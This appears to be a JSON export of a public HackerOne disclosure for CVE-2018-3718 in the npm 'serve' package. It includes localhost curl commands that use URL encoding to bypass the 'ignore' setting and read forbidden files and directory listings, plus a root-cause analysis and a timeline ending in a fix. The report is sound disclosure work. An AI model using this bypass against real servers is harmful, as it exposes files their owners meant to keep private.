@@ -1,0 +1,612 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-03-13T06:53:14.126Z", 
+    "voters": [
+        "bl4de", 
+        "riramar", 
+        "muon4", 
+        "tungpun", 
+        "eveeez", 
+        "kieran", 
+        "0xchr00t", 
+        "yasar", 
+        "whitesector", 
+        "x1m", 
+        "and 5 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 308721, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-03-12T13:35:58.228Z", 
+    "vulnerability_information": "**Module:** \n- **Name**: `serve`\n- **Version**: latest (`6.4.9`)\n- **Link**: https://www.npmjs.com/package/serve\n\n**Description:**\nThe `serve` modules allows directory browsing and to serve static files through the browser.\nThe config option `ignore` can be used to tell the module which file or directory are forbidden and should not be served. \nThis rule can be bypassed by url encoding the name of the file or directory that has been forbidden. \n\n## Reproduction Steps:\n- Install `serve`\n- Create an application that uses serve for file serving listing and set a few folders and files in the `ignore` config.\n\n```javascript\nconst serve = require('serve')\nconst server = serve(__dirname, {\n\t  port: 1337,\n\t  ignore: ['testfolder', 'test.txt']\n})\n```\n- Run the app\n\n```bash\n$ node filename.js\n```\n- Now, current directory will be served by `serve` with the exception of folder `testfolder` and file `test.txt`\n- If we try to curl `test.txt` we get a `Not Found` error\n\n```bash\n$ curl http://localhost:1337/test.txt\nNot Found\n```\n- The url encoded value for `e` is `%65`. So after replacing an `e` with its url encoded form, we are able to access the file.\n\n```bash\n$ curl http://localhost:1337/t%65st.txt\nthis is a forbidden file :D\n```\n- Additionally, curling the directory `testfolder` returns a 404 too.\n\n```bash\n$ curl http://localhost:1337/testfolder/\nNot Found\n```\n- Applying the same strategy as above, we are able to get a listing of all the files and folders inside the restricted directory.\n\n```html\n$ curl http://localhost:1337/t%65stfolder/\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Files within testserve/testfolder/</title>\n      .\n      .\n          <li>\n            <a href=\"/testfolder/testfile.txt\" title=\"testfile.txt\" class=\"txt\">testfile.txt</a>\n            <i>31 B</i>\n          </li>\n      .\n      .\n```\n- And then we can further access the files inside the forbidden folder using same strategy.\n\n```bash\n$ curl http://localhost:1337/t%65stfolder/testfile.txt\nthis is a test ... forbidden !\n```\n\n\n## Mitigation Strategy\nFrom what I could gather, this is happening because the path variable that is being checked against the user created forbidden folders blacklist, is essentially different from the one which is being used to serve the file/folder. \nNote these particular lines in file `/lib/server.js`-\n\n```javascript\n90  const ignored = !ignoredFiles.every(item => {\n91    return !pathname.includes(item)\n92  })\n```\nLine `91` handles the logic for checking if one of the ignored folder/file names is present in the current requested path. Note that here, the variable `pathname` is used. This variable is not url decoded, while the variable which is used to actually serve the file is named `related` and is url decoded by passing requested path through `decodeURIComponent` function.\nSo one strategy would be to use the `related` variable for checking against the blacklist too.\n\n## Impact\n\nThe issue essentially bypasses the `ignore files/folders` feature and allows an attacker to read from a directory/file that the victim has not allowed access to.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "unchanged", 
+            "integrity": "none", 
+            "availability": "none"
+        }, 
+        "rating": "critical", 
+        "score": 9.3, 
+        "author_type": "Team"
+    }, 
+    "title": "[serve] Directory listing and File access even when they have been set to be ignored.", 
+    "is_member_of_team?": null, 
+    "vote_count": 15, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "serve", 
+        "max_severity": "critical", 
+        "databaseId": 5006, 
+        "asset_type": "SOURCE_CODE"
+    }, 
+    "allow_singular_disclosure_at": "2018-04-11T13:35:58.327Z", 
+    "state": "Closed", 
+    "cve_ids": [
+        "CVE-2018-3718"
+    ], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-24T20:35:10.373Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-24T20:35:10.373Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hey @digitalwizard ,\n\nThanks a lot for reporting this to us, I will look at this issue shortly and keep you updated!", 
+            "markdown_message": "<p>Hey <a href=\"/digitalwizard\">@digitalwizard</a> ,</p>\n\n<p>Thanks a lot for reporting this to us, I will look at this issue shortly and keep you updated!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2314625, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-24T20:42:52.198Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-24T20:42:52.198Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@digitalwizard I was able to reproduce the described behavior on it looks to me this is a security issue. Did you already contact Leo Lamprecht about this? I am inviting him to join this report.", 
+            "markdown_message": "<p><a href=\"/digitalwizard\">@digitalwizard</a> I was able to reproduce the described behavior on it looks to me this is a security issue. Did you already contact Leo Lamprecht about this? I am inviting him to join this report.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 2314640, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-24T20:49:16.654Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-24T20:49:30.015Z", 
+            "actor": {
+                "username": "0xchr00t", 
+                "url": "/0xchr00t", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/217/909/dc034749a04d230164fc7424aab60ea2a12c1d6d_medium.jpg?1520346370"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Wow, that was a very swift response :)\nAnd no, I did not contact Leo. I thought doing it through this program would be a better option and it'll keep all the discussion in one place.", 
+            "markdown_message": "<p>Wow, that was a very swift response :)<br>\nAnd no, I did not contact Leo. I thought doing it through this program would be a better option and it&#39;ll keep all the discussion in one place.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2314649, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-24T20:55:43.938Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-24T20:55:43.938Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@digitalwizard perfect, we always ask in order to know if we should contact the maintainers ourselves. I invited him a few minutes ago :)", 
+            "markdown_message": "<p><a href=\"/digitalwizard\">@digitalwizard</a> perfect, we always ask in order to know if we should contact the maintainers ourselves. I invited him a few minutes ago :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2314672, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T04:38:51.459Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T04:38:51.459Z", 
+            "actor": {
+                "username": "reed", 
+                "url": "/reed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "cve_ids": [
+                "CVE-2018-3718"
+            ], 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::CveIdAdded", 
+            "id": 2361144, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-13T11:44:15.489Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-13T11:44:15.489Z", 
+            "actor": {
+                "username": "0xchr00t", 
+                "url": "/0xchr00t", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/217/909/dc034749a04d230164fc7424aab60ea2a12c1d6d_medium.jpg?1520346370"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi @vdeturckheim ,\nHas there been an update on this?", 
+            "markdown_message": "<p>Hi <a href=\"/vdeturckheim\">@vdeturckheim</a> ,<br>\nHas there been an update on this?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2378423, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-15T19:04:42.481Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-15T19:04:42.481Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@digitalwizard sadly no. I will ping him back.", 
+            "markdown_message": "<p><a href=\"/digitalwizard\">@digitalwizard</a> sadly no. I will ping him back.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2387542, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-04T20:29:55.832Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-04T20:29:55.832Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "I pinged Zeit team as @lirantal suggested.", 
+            "markdown_message": "<p>I pinged Zeit team as <a href=\"/lirantal\">@lirantal</a> suggested.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2456039, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-04T22:13:41.607Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-04T22:13:41.607Z", 
+            "actor": {
+                "username": "timn", 
+                "url": "/timn", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ExternalUserJoined", 
+            "id": 2456231, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-04T22:15:05.865Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-04T22:15:05.865Z", 
+            "actor": {
+                "username": "matheus", 
+                "url": "/matheus", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/247/741/1b95bb97fb2bdb7ae838056cd3a00d049c4a5715_medium.jpeg?1520202163"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ExternalUserJoined", 
+            "id": 2456233, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-04T22:26:19.295Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-04T22:26:19.295Z", 
+            "actor": {
+                "username": "matheus", 
+                "url": "/matheus", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/247/741/1b95bb97fb2bdb7ae838056cd3a00d049c4a5715_medium.jpeg?1520202163"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi @digitalwizard and @vdeturckheim,\n\nThank you for reporting and for your patience.\n\nI apologize for the misunderstanding \u2013 security is our topmost priority and this should have been handled as soon as we were first notified about it.\n\nWe can reproduce the issue and a fix will be out in the next 24h. Will keep you posted here.", 
+            "markdown_message": "<p>Hi <a href=\"/digitalwizard\">@digitalwizard</a> and <a href=\"/vdeturckheim\">@vdeturckheim</a>,</p>\n\n<p>Thank you for reporting and for your patience.</p>\n\n<p>I apologize for the misunderstanding \u2013 security is our topmost priority and this should have been handled as soon as we were first notified about it.</p>\n\n<p>We can reproduce the issue and a fix will be out in the next 24h. Will keep you posted here.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2456333, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-04T22:27:11.897Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-04T22:27:11.897Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Awesome, thanks @matheus ", 
+            "markdown_message": "<p>Awesome, thanks <a href=\"/matheus\">@matheus</a> </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2456342, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-04T23:57:43.893Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-04T23:57:56.818Z", 
+            "actor": {
+                "username": "matheus", 
+                "url": "/matheus", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/247/741/1b95bb97fb2bdb7ae838056cd3a00d049c4a5715_medium.jpeg?1520202163"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@digitalwizard,\n\n@timn just submitted a fix and proper tests for this issue: https://github.com/zeit/serve/pull/341\n\nWe'd like you to review it before we release it. Thank you!", 
+            "markdown_message": "<p><a href=\"/digitalwizard\">@digitalwizard</a>,</p>\n\n<p><a href=\"/timn\">@timn</a> just submitted a fix and proper tests for this issue: <a title=\"https://github.com/zeit/serve/pull/341\" href=\"/redirect?signature=8ca2bc168ebe228df59bbd2fdd69c993427bb958&amp;url=https%3A%2F%2Fgithub.com%2Fzeit%2Fserve%2Fpull%2F341\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/zeit/serve/pull/341</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>We&#39;d like you to review it before we release it. Thank you!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2456453, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-05T03:01:01.922Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-05T03:01:01.922Z", 
+            "actor": {
+                "username": "0xchr00t", 
+                "url": "/0xchr00t", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/217/909/dc034749a04d230164fc7424aab60ea2a12c1d6d_medium.jpg?1520346370"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Great job @matheus ,\nThe PR by @timn fixes the issue.", 
+            "markdown_message": "<p>Great job <a href=\"/matheus\">@matheus</a> ,<br>\nThe PR by <a href=\"/timn\">@timn</a> fixes the issue.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2456584, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-05T18:18:50.091Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-05T18:18:50.091Z", 
+            "actor": {
+                "username": "notquiteleo", 
+                "url": "/notquiteleo", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/234/441/0ca1c577c2dcca7e81a3ce4c67bccf26f73ff80e_medium.jpg?1516629967"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ExternalUserJoined", 
+            "id": 2461040, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-05T18:25:47.869Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-05T18:25:47.869Z", 
+            "actor": {
+                "username": "notquiteleo", 
+                "url": "/notquiteleo", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/234/441/0ca1c577c2dcca7e81a3ce4c67bccf26f73ff80e_medium.jpg?1516629967"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Thank you for reporting this, @digitalwizard!\n\nThe fix was just released with the latest update: https://github.com/zeit/serve/releases/tag/6.5.2", 
+            "markdown_message": "<p>Thank you for reporting this, <a href=\"/digitalwizard\">@digitalwizard</a>!</p>\n\n<p>The fix was just released with the latest update: <a title=\"https://github.com/zeit/serve/releases/tag/6.5.2\" href=\"/redirect?signature=dffa6fc28628433ae36d3f93b652ebeccbe35c07&amp;url=https%3A%2F%2Fgithub.com%2Fzeit%2Fserve%2Freleases%2Ftag%2F6.5.2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/zeit/serve/releases/tag/6.5.2</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2461063, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "0xchr00t", 
+                "url": "/0xchr00t"
+            }, 
+            "created_at": "2018-03-12T13:35:43.337Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-12T13:35:43.337Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2482710, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-12T13:35:58.270Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-12T13:35:58.270Z", 
+            "actor": {
+                "username": "vdeturckheim", 
+                "url": "/vdeturckheim", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/161/010/a8ef3570e084af57bff77fbc33de7281eb3d8a45_medium.jpg?1508181781"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2482711, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-13T06:53:14.170Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-13T06:53:14.170Z", 
+            "actor": {
+                "username": "0xchr00t", 
+                "url": "/0xchr00t", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/217/909/dc034749a04d230164fc7424aab60ea2a12c1d6d_medium.jpg?1520346370"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2487060, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-13T06:53:14.288Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-13T06:53:14.288Z", 
+            "actor": {
+                "username": "0xchr00t", 
+                "url": "/0xchr00t", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/217/909/dc034749a04d230164fc7424aab60ea2a12c1d6d_medium.jpg?1520346370"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2487061, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-14T19:53:32.471Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-14T19:53:32.471Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical (9.3)", 
+                "old_severity": null
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2492969, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "0xchr00t", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/0xchr00t", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/217/909/dd171955ff24e50d3925ad9adb0bdaacb74d533e_small.jpg?1520346370"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 89, 
+        "name": "Information Exposure Through Directory Listing"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -20681417.990988977, 
+    "disclosed_at": "2018-03-13T06:53:14.242Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/308721", 
+    "created_at": "2018-01-24T19:02:23.144Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p><strong>Module:</strong> </p>\n\n<ul>\n<li>\n<strong>Name</strong>: <code>serve</code>\n</li>\n<li>\n<strong>Version</strong>: latest (<code>6.4.9</code>)</li>\n<li>\n<strong>Link</strong>: <a title=\"https://www.npmjs.com/package/serve\" href=\"/redirect?signature=330ade5f3e8725e433110dc283931dc8f758aa56&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fserve\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/serve</span><i class=\"icon-external-link\"></i></a>\n</li>\n</ul>\n\n<p><strong>Description:</strong><br>\nThe <code>serve</code> modules allows directory browsing and to serve static files through the browser.<br>\nThe config option <code>ignore</code> can be used to tell the module which file or directory are forbidden and should not be served. <br>\nThis rule can be bypassed by url encoding the name of the file or directory that has been forbidden. </p>\n\n<h2 id=\"reproduction-steps\">Reproduction Steps:</h2>\n\n<ul>\n<li>Install <code>serve</code>\n</li>\n<li>Create an application that uses serve for file serving listing and set a few folders and files in the <code>ignore</code> config.</li>\n</ul>\n<pre class=\"highlight javascript\"><code><span class=\"kr\">const</span> <span class=\"nx\">serve</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">&#39;serve&#39;</span><span class=\"p\">)</span>\n<span class=\"kr\">const</span> <span class=\"nx\">server</span> <span class=\"o\">=</span> <span class=\"nx\">serve</span><span class=\"p\">(</span><span class=\"nx\">__dirname</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n      <span class=\"na\">port</span><span class=\"p\">:</span> <span class=\"mi\">1337</span><span class=\"p\">,</span>\n      <span class=\"na\">ignore</span><span class=\"p\">:</span> <span class=\"p\">[</span><span class=\"s1\">&#39;testfolder&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;test.txt&#39;</span><span class=\"p\">]</span>\n<span class=\"p\">})</span>\n</code></pre>\n<ul>\n<li>Run the app</li>\n</ul>\n<pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>node filename.js\n</code></pre>\n<ul>\n<li>Now, current directory will be served by <code>serve</code> with the exception of folder <code>testfolder</code> and file <code>test.txt</code>\n</li>\n<li>If we try to curl <code>test.txt</code> we get a <code>Not Found</code> error</li>\n</ul>\n<pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>curl http://localhost:1337/test.txt\nNot Found\n</code></pre>\n<ul>\n<li>The url encoded value for <code>e</code> is <code>%65</code>. So after replacing an <code>e</code> with its url encoded form, we are able to access the file.</li>\n</ul>\n<pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>curl http://localhost:1337/t%65st.txt\nthis is a forbidden file :D\n</code></pre>\n<ul>\n<li>Additionally, curling the directory <code>testfolder</code> returns a 404 too.</li>\n</ul>\n<pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>curl http://localhost:1337/testfolder/\nNot Found\n</code></pre>\n<ul>\n<li>Applying the same strategy as above, we are able to get a listing of all the files and folders inside the restricted directory.</li>\n</ul>\n<pre class=\"highlight html\"><code>$ curl http://localhost:1337/t%65stfolder/\n<span class=\"cp\">&lt;!DOCTYPE html&gt;</span>\n<span class=\"nt\">&lt;html</span> <span class=\"na\">lang=</span><span class=\"s\">&quot;en&quot;</span><span class=\"nt\">&gt;</span>\n  <span class=\"nt\">&lt;head&gt;</span>\n    <span class=\"nt\">&lt;meta</span> <span class=\"na\">charset=</span><span class=\"s\">&quot;utf-8&quot;</span><span class=\"nt\">&gt;</span>\n    <span class=\"nt\">&lt;meta</span> <span class=\"na\">name=</span><span class=\"s\">&quot;viewport&quot;</span> <span class=\"na\">content=</span><span class=\"s\">&quot;width=device-width, initial-scale=1&quot;</span><span class=\"nt\">&gt;</span>\n    <span class=\"nt\">&lt;title&gt;</span>Files within testserve/testfolder/<span class=\"nt\">&lt;/title&gt;</span>\n      .\n      .\n          <span class=\"nt\">&lt;li&gt;</span>\n            <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;/testfolder/testfile.txt&quot;</span> <span class=\"na\">title=</span><span class=\"s\">&quot;testfile.txt&quot;</span> <span class=\"na\">class=</span><span class=\"s\">&quot;txt&quot;</span><span class=\"nt\">&gt;</span>testfile.txt<span class=\"nt\">&lt;/a&gt;</span>\n            <span class=\"nt\">&lt;i&gt;</span>31 B<span class=\"nt\">&lt;/i&gt;</span>\n          <span class=\"nt\">&lt;/li&gt;</span>\n      .\n      .\n</code></pre>\n<ul>\n<li>And then we can further access the files inside the forbidden folder using same strategy.</li>\n</ul>\n<pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>curl http://localhost:1337/t%65stfolder/testfile.txt\nthis is a <span class=\"nb\">test</span> ... forbidden !\n</code></pre>\n<h2 id=\"mitigation-strategy\">Mitigation Strategy</h2>\n\n<p>From what I could gather, this is happening because the path variable that is being checked against the user created forbidden folders blacklist, is essentially different from the one which is being used to serve the file/folder. <br>\nNote these particular lines in file <code>/lib/server.js</code>-</p>\n<pre class=\"highlight javascript\"><code><span class=\"mi\">90</span>  <span class=\"kr\">const</span> <span class=\"nx\">ignored</span> <span class=\"o\">=</span> <span class=\"o\">!</span><span class=\"nx\">ignoredFiles</span><span class=\"p\">.</span><span class=\"nx\">every</span><span class=\"p\">(</span><span class=\"nx\">item</span> 